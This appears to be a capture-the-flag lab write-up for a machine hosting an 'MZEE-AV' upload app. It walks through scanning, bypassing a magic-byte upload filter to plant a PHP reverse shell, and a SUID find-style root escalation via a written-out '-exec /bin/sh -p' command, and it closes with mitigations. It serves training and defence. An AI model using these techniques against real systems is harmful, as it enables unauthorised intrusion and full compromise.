## Introduction

In this walkthrough, I began by scanning the target machine and found that **ports 22 and 80** were open. Upon visiting port **80**, I encountered a web application named **MZEE-AV**, which simulates antivirus behavior by scanning uploaded files to determine if they're clean.

Using **Gobuster**, I discovered a hidden directory named `/backups`, which contained two files: `upload.php` and `listing.php`. By examining the source code of `upload.php`, I noticed a **filter mechanism** that attempts to validate uploaded files. I was able to **bypass this filter** and successfully upload a **PHP reverse shell**.

After gaining a reverse shell, I continued local enumeration and discovered a **SUID binary** named `fileS`. Upon checking its usage via the `--help` and `--version` flags, I determined that `fileS` was an **alternative implementation of the `find` command**. I leveraged this to escalate privileges using a known **SUID privilege escalation technique** applicable to the `find` binary, ultimately gaining **root access**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

- Version - OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)

We usually skip SSH.

## Web

### Port 80

- Version - Apache httpd 2.4.56 ((Debian))

```bash
searchsploit apache 2.4.56
```

No public exploits for this version of Apache.

- Gobuster Scan
    
    ```bash
    gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 42 -x .php
    ```

## Exploitation

Going to `backups` we can download `backup.zip` file, where we can see `upload.php`, `listing.php`. Reading upload.php:

```php
<?php

/* Get the name of the uploaded file */
$filename = $_FILES['file']['name'];

/* Choose where to save the uploaded file */
$tmp_location = "upload/file.tmp";
$location = "upload/".$filename;

/* Move the file temporary */

move_uploaded_file($_FILES['file']['tmp_name'], $tmp_location);

/* Check MagicBytes MZ PEFILE 4D5A*/
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));

/* if its not a PEFILE block it - str_contains onlz php 8*/
//if ( ! (str_contains($magicbytes, '4D5A'))) {
if ( strpos($magicbytes, '4D5A') === false ) {
	echo "Error no valid PEFILE\n";
	error_log(print_r("No valid PEFILE", TRUE));
	error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
	exit ();
}

rename($tmp_location, $location);

?>
```

It gets the filename, puts it as temporary name to temporary location which is `file.tmp` . Then it performs check to see if uploaded file is `exe` file or not. If it is, then file placed under `upload` directory with its original name, if not it exits with `exit()` and file is stored in `file.tmp`. 

```php
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));
```

- Opens the file
- Reads 2 bytes ( first 2 characters )
- Uses `bin2hex` function of PHP to convert string to hex value and takes first 4 positions of that hex value.

```php
if ( strpos($magicbytes, '4D5A') === false ) {
	echo "Error no valid PEFILE\n";
	error_log(print_r("No valid PEFILE", TRUE));
	error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
	exit ();
}
```

- Checks if `$magicbytes` variable contains string `4D5A`

So, as you can guess we need to change the magic bytes of a file in a way that when it takes first 2 characters and converts it to hex it should produce `4D5A`.  In orde to find that 2 characters let’s do reverse of `bin2hex` function, let’s convert `4D5A` to string. You can do that here:

[hex-to-ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

That means we should prepend the file with MZ intercepting it with BurpSuite.

After that we will receive another form of listing where in this case our file is listed not `file.tmp`.

I tried uploading both [Ivan Sincek](https://github.com/ivan-sincek/php-reverse-shell)  and [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell) reverse shell but they failed to open a shell:

![image.png](image%205.png)

I searched for another one and found [this](https://github.com/xdayeh/Php-Reverse-Shell/blob/master/PHP-Reverse-Shell.php), this worked and I got a shell.

Using python I made a shell interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles

I found unusual SUID binary:

![image.png](image%207.png)

We can just execute that file. Executing it we see that it lists files of the current directory.

![image.png](image%208.png)

As it is a binary, and almost all binaries have `--help` and `--version` menu. Let’s check them:

```bash
./fileS --help
```

![image.png](image%209.png)

```bash
./fileS --version
```

We see that it is an alternative of `find` binary.

![image.png](image%2010.png)

Let’s perform then SUID privilege escalation of find binary with this binary using [GTFOBins-find](https://gtfobins.github.io/gtfobins/find/#suid)

```bash
./fileS . -exec /bin/sh -p \; -quit
```

Now our effective user is root and we are in a root group.

## Mitigation

- **Restrict directory access** and disable directory listing in production environments.
- Implement **strict server-side file validation** for file uploads, including MIME type checks, file signature verification, and limiting allowed file extensions.
- Store uploaded files **outside the web root** and rename them to prevent direct execution.
- **Remove unnecessary SUID binaries** or audit them carefully to ensure they are not exploitable.
- Regularly scan for and remove **unused or custom binaries** with elevated privileges.
- Monitor file uploads and application logs for **anomalous behavior or bypass attempts**.
